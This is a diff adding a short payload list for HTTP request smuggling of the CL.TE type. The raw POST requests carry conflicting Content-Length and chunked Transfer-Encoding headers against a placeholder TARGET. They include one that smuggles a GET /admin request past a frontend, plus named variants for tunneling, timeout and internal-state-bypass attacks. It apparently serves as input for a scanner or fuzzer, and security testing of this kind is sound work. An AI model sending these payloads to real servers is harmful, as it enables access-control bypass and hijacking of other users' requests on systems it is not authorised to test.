@@ -1,0 +1,14 @@
+POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED
+POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG
+POST /search HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\ne\r\nq=smuggled&x=\r\n0\r\n\r\n
+POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 30\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ\r\n
+POST /api HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 5\r\n\r\nx=1
+CL.TE: CL_frontend_TE_backend
+CL-0: Content-Length: 0 with chunked body terminating prematurely
+POST / CL=6 TE=chunked 0\r\n\r\nGET /evil
+POST / CL=3 TE=chunked 0\r\n\r\nPOST /smuggled
+desync_cl_te_0chunk
+cl_te_differential_response
+cl_te_request_tunneling
+cl_te_timeout_attack
+cl_te_internal_state_bypass
